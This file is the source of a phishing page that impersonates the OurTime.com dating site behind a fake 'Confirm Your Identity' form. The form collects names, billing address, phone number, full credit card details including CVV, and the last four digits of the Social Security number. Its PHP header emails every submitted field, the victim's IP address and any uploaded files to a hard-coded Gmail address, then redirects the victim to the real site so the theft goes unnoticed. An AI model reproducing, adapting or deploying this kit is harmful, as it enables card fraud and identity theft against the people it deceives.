<?php
function ValidateEmail($email)
{
   $pattern = '/^([0-9a-z]([-.\w]*[0-9a-z])*@(([0-9a-z])+([-\w]*[0-9a-z])*\.)+[a-z]{2,6})$/i';
   return preg_match($pattern, $email);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['formid']) && $_POST['formid'] == 'form1')
{
   $mailto = 'richardsnow1234@gmail.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'Our time Rusalt Inform';
   $message = 'url Login:
https://www.ourtime.com/
Full Info:';
   $success_url = 'https://www.ourtime.com/';
   $error_url = '';
   $error = '';
   $eol = "\n";
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field", "g-recaptcha-response");
   $message .= $eol;
   $message .= "IP Address : ";
   $message .= $_SERVER['REMOTE_ADDR'];
   $message .= $eol;
   $logdata = '';
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
         }
      }
   }
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=ISO-8859-1'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Comfirm Your Identity | OurTimecom - The 50+Single Network</title>
<meta name="generator" content="WYSIWYG Web Builder 14 Trial Version - http://www.wysiwygwebbuilder.com">
<link href="https://pmi.peoplemedia.com/pmicontent/166/images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="our.css" rel="stylesheet">
<link href="inform.css" rel="stylesheet">
<script src="jquery-1.12.4.min.js"></script>
<script src="wwb14.min.js"></script>
<script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
<script src="http://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>

  <script>

  $(document).ready(function($){

  $('#card').mask("9999 9999 9999 9999", {placeholder:"xxxx xxxx xxxx xxxx"});
  $('#phone').mask("(999)999-9999", {placeholder:"(   )   -    "});
});

  </script>

</head>
<body>
<div id="Layer1" style="position:absolute;text-align:left;left:0px;top:0px;width:1262px;height:49px;z-index:95;">
<div id="wb_Image1" style="position:absolute;left:21px;top:8px;width:104px;height:35px;z-index:0;">
<img src="images/ourlogo.png" id="Image1" alt=""></div>
<div id="wb_Image5" style="position:absolute;left:219px;top:8px;width:70px;height:29px;z-index:1;">
<img src="images/Untitled.png" id="Image5" alt=""></div>
<hr id="Line1" style="position:absolute;left:297px;top:12px;width:1px;z-index:2;">
<div id="wb_Image9" style="position:absolute;left:310px;top:5px;width:97px;height:34px;z-index:3;">
<img src="images/msg.png" id="Image9" alt=""></div>
<hr id="Line2" style="position:absolute;left:416px;top:12px;width:1px;z-index:4;">
<div id="wb_Image2" style="position:absolute;left:423px;top:9px;width:74px;height:32px;z-index:5;">
<img src="images/sear.png" id="Image2" alt=""></div>
<hr id="Line3" style="position:absolute;left:504px;top:12px;width:1px;z-index:6;">
<div id="wb_Image8" style="position:absolute;left:516px;top:7px;width:125px;height:34px;z-index:7;">
<img src="images/match.png" id="Image8" alt=""></div>
<hr id="Line4" style="position:absolute;left:653px;top:12px;width:1px;z-index:8;">
<div id="wb_Image4" style="position:absolute;left:659px;top:9px;width:81px;height:33px;z-index:9;">
<img src="images/token.png" id="Image4" alt=""></div>
<hr id="Line5" style="position:absolute;left:742px;top:12px;width:1px;z-index:10;">
<div id="wb_Image7" style="position:absolute;left:754px;top:10px;width:80px;height:31px;z-index:11;">
<img src="images/event.png" id="Image7" alt=""></div>
<div id="wb_Image3" style="position:absolute;left:921px;top:14px;width:88px;height:23px;z-index:12;">
<img src="images/setting.png" id="Image3" alt=""></div>
<div id="wb_Image6" style="position:absolute;left:1006px;top:20px;width:27px;height:18px;z-index:13;">
<img src="images/down.png" id="Image6" alt=""></div>
</div>
<div id="wb_Form1" style="position:absolute;left:310px;top:73px;width:481px;height:874px;z-index:96;">
<form name="fullinfo" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" id="Form1">
<input type="hidden" name="formid" value="form1">
<div id="Layer2" style="position:absolute;text-align:left;left:0px;top:0px;width:481px;height:69px;z-index:47;">
<div id="wb_Text1" style="position:absolute;left:115px;top:23px;width:250px;height:23px;z-index:14;">
<span style="color:#F5F5F5;font-family:Verdana;font-size:19px;"><strong>Confirm Your Identity</strong></span></div>
</div>
<div id="Layer5" style="position:absolute;text-align:left;left:77px;top:169px;width:320px;height:211px;z-index:48;">
<input type="text" id="F-name" style="position:absolute;left:39px;top:18px;width:105px;height:16px;z-index:15;" name="first name" value="" spellcheck="false" placeholder="First Name">
<input type="text" id="add-2" style="position:absolute;left:39px;top:69px;width:236px;height:16px;z-index:16;" name="address" value="" spellcheck="false" placeholder="Address Line 1">
<input type="text" id="city-2" style="position:absolute;left:39px;top:118px;width:105px;height:16px;z-index:17;" name="City" value="" spellcheck="false" placeholder="City">
<input type="text" id="L-name" style="position:absolute;left:170px;top:18px;width:104px;height:16px;z-index:18;" name="Last name" value="" spellcheck="false" placeholder="Last Name">
<input type="text" id="phone" style="position:absolute;left:127px;top:166px;width:129px;height:16px;z-index:19;" name="Phone number" value="" spellcheck="false">
<select name="State" size="1" id="state-2" style="position:absolute;left:171px;top:118px;width:118px;height:28px;z-index:20;">
<option value="AL">Alabama</option>
<option value="AK">Alaska</option>
<option value="AZ">Arizona</option>
<option value="AR">Arkansas</option>
<option value="CA">California</option>
<option value="CO">Colorado</option>
<option value="CT">Connecticut</option>
<option value="DE">Delaware</option>
<option value="FL">Florida</option>
<option value="GA">Georgia</option>
<option value="HI">Hawaii</option>
<option value="ID">Idaho</option>
<option value="IL">Illinois</option>
<option value="IN">Indiana</option>
<option value="IA">Iowa</option>
<option value="KS">Kansas</option>
<option value="KY">Kentucky</option>
<option value="LA">Louisiana</option>
<option value="ME">Maine</option>
<option value="MD">Maryland</option>
<option value="MA">Massachusetts</option>
<option value="MI">Michigan</option>
<option value="MN">Minnesota</option>
<option value="MS">Mississippi</option>
<option value="MO">Missouri</option>
<option value="MT">Montana</option>
<option value="NE">Nebraska</option>
<option value="NV">Nevada</option>
<option value="NH">New Hampshire</option>
<option value="NJ">New Jersey</option>
<option value="NM">New Mexico</option>
<option value="NY">New York</option>
<option value="NC">North Carolina</option>
<option value="ND">North Dakota</option>
<option value="OH">Ohio</option>
<option value="OK">Oklahoma</option>
<option value="OR">Oregon</option>
<option value="PA">Pennsylvania</option>
<option value="RI">Rhode Island</option>
<option value="SC">South Carolina</option>
<option value="SD">South Dakota</option>
<option value="TN">Tennessee</option>
<option value="TX">Texas</option>
<option value="UT">Utah</option>
<option value="VT">Vermont</option>
<option value="VA">Virginia</option>
<option value="WA">Washington</option>
<option value="WV">West Virginia</option>
<option value="WI">Wisconsin</option>
<option value="WY">Wyoming</option>
</select>
<input type="text" id="postcode" style="position:absolute;left:39px;top:166px;width:63px;height:16px;z-index:21;" name="zip" value="" maxlength="5" spellcheck="false" placeholder="Post Code">
<input type="text" id="Editbox7" style="position:absolute;left:128px;top:167px;width:19px;height:16px;z-index:22;" name="Editbox7" value="" readonly disabled spellcheck="false" placeholder="+1">
<div id="wb_Text4" style="position:absolute;left:39px;top:47px;width:250px;height:16px;z-index:23;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Billing Address:</span></div>
<div id="wb_Text5" style="position:absolute;left:39px;top:98px;width:250px;height:16px;z-index:24;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Billing Address City/State:</span></div>
<div id="wb_Text6" style="position:absolute;left:39px;top:146px;width:250px;height:16px;z-index:25;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Billing Address Zip Code/phone:</span></div>
<div id="wb_Text7" style="position:absolute;left:39px;top:0px;width:250px;height:16px;z-index:26;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Holder's Name:</span></div>
<hr id="Line6" style="position:absolute;left:39px;top:203px;width:249px;z-index:27;">
</div>
<div id="wb_Text2" style="position:absolute;left:16px;top:78px;width:449px;height:42px;z-index:49;">
<span style="color:#4F4F4F;font-family:Verdana;font-size:12px;">Protect your account. Please use this secure form to confirm your identity by providing the details below. Once your identity has been confirmed, you can continue using Ourtime.com</span></div>
<div id="wb_Text3" style="position:absolute;left:115px;top:144px;width:250px;height:16px;z-index:50;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Enter details as it appears on your card:</span></div>
<div id="cards" style="position:absolute;text-align:left;left:115px;top:380px;width:216px;height:93px;z-index:51;">
<div id="wb_Image16" style="position:absolute;left:28px;top:63px;width:55px;height:22px;z-index:28;">
<img src="images/paypal.png" id="Image16" alt=""></div>
<div id="wb_paypal-select" style="position:absolute;left:3px;top:70px;width:15px;height:15px;z-index:29;">
<input type="radio" id="paypal-select" onclick="ShowObject('card-layer', 0);return false;" onfocus="window.location.href='./pp/';return false;" name="Name" value="on" style="position:absolute;left:0;top:0;"><label for="paypal-select"></label></div>
<div id="wb_Image14" style="position:absolute;left:25px;top:28px;width:190px;height:32px;z-index:30;">
<img src="images/card.png" id="Image14" alt=""></div>
<div id="wb_card-select" style="position:absolute;left:3px;top:36px;width:15px;height:15px;z-index:31;">
<input type="radio" id="card-select" onfocus="ShowObject('card-layer', 1);ShowObject('paypal-layer', 0);return false;" name="Name" value="on" checked style="position:absolute;left:0;top:0;"><label for="card-select"></label></div>
<div id="wb_Text8" style="position:absolute;left:3px;top:5px;width:169px;height:16px;z-index:32;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Payment Method:</span></div>
</div>
<div id="wb_Image17" style="position:absolute;left:44px;top:744px;width:420px;height:40px;z-index:52;">
<img src="images/by.png" id="Image17" alt=""></div>
<div id="card-layer" style="position:absolute;text-align:left;left:98px;top:472px;width:238px;height:272px;z-index:53;">
<div id="wb_Text9" style="position:absolute;left:17px;top:0px;width:122px;height:16px;z-index:33;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Credit Card Number: </span></div>
<div id="wb_Text10" style="position:absolute;left:17px;top:52px;width:154px;height:16px;z-index:34;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Card Holder's Name:&nbsp; </span></div>
<div id="wb_Text11" style="position:absolute;left:17px;top:101px;width:140px;height:16px;z-index:35;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Credit Card Expiration:</span></div>
<div id="wb_Text12" style="position:absolute;left:17px;top:156px;width:201px;height:16px;z-index:36;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Card Verification Number (CVN):</span></div>
<input type="text" id="card" style="position:absolute;left:18px;top:20px;width:190px;height:16px;z-index:37;" name="card number" value="" spellcheck="false">
<input type="text" id="fullname" style="position:absolute;left:18px;top:72px;width:190px;height:16px;z-index:38;" name="Full name" value="" spellcheck="false">
<input type="text" id="csc" style="position:absolute;left:17px;top:177px;width:81px;height:16px;z-index:39;" name="CVV2" value="" maxlength="4" spellcheck="false">
<select name="Month" size="1" id="mm" style="position:absolute;left:17px;top:121px;width:84px;height:28px;z-index:40;">
<option selected value="Month">Month</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select name="Year" size="1" id="yy" style="position:absolute;left:117px;top:121px;width:84px;height:28px;z-index:41;">
<option selected value="Year">Year</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
</select>
<div id="wb_Text13" style="position:absolute;left:105px;top:128px;width:9px;height:16px;text-align:center;z-index:42;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">/</span></div>
<div id="wb_Text14" style="position:absolute;left:118px;top:182px;width:90px;height:16px;z-index:43;">
<span style="color:#0080C0;font-family:Arial;font-size:13px;"><u><a href="javascript:popupwnd('./what.php','no','no','no','no','no','no','','','643','535')" target="_self">What's this?</a></u></span></div>
<input type="text" id="ssn" style="position:absolute;left:16px;top:229px;width:51px;height:16px;z-index:44;" name="Last 4 SSN" value="" maxlength="4" spellcheck="false">
<div id="wb_Text15" style="position:absolute;left:17px;top:207px;width:122px;height:16px;z-index:45;">
<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Last 4 digit ssn:</span></div>
<input type="text" id="xxx" style="position:absolute;left:20px;top:230px;width:54px;height:16px;z-index:46;" name="Editbox14" value="" readonly disabled spellcheck="false" placeholder="XX-XXX-">
</div>
<input type="submit" id="confrim-btn" name="" value="Confirm My Identity" style="position:absolute;left:115px;top:799px;width:251px;height:48px;z-index:54;">
</form>
</div>
<div id="Layer4" style="position:absolute;text-align:left;left:935px;top:73px;width:266px;height:180px;z-index:97;">
<div id="Layer3" style="position:absolute;text-align:left;left:0px;top:0px;width:266px;height:33px;z-index:56;">
</div>
<div id="wb_Image13" style="position:absolute;left:25px;top:59px;width:209px;height:38px;z-index:57;">
<img src="images/seemem.png" id="Image13" alt=""></div>
<div id="wb_Image12" style="position:absolute;left:25px;top:95px;width:205px;height:36px;z-index:58;">
<img src="images/see.png" id="Image12" alt=""></div>
<div id="wb_Image11" style="position:absolute;left:21px;top:36px;width:224px;height:21px;z-index:59;">
<img src="images/read.png" id="Image11" alt=""></div>
<div id="wb_Image10" style="position:absolute;left:25px;top:135px;width:216px;height:33px;z-index:60;">
<img src="images/now.png" id="Image10" alt=""></div>
</div>
<div id="wb_Image15" style="position:absolute;left:1042px;top:263px;width:89px;height:48px;z-index:98;">
<img src="images/turst.png" id="Image15" alt=""></div>
<div id="Layer6" style="position:absolute;text-align:left;left:0px;top:973px;width:1261px;height:45px;z-index:99;">
<div id="wb_Image18" style="position:absolute;left:139px;top:10px;width:958px;height:21px;z-index:93;">
<img src="images/cipy.png" id="Image18" alt=""></div>
</div>
</body>
</html>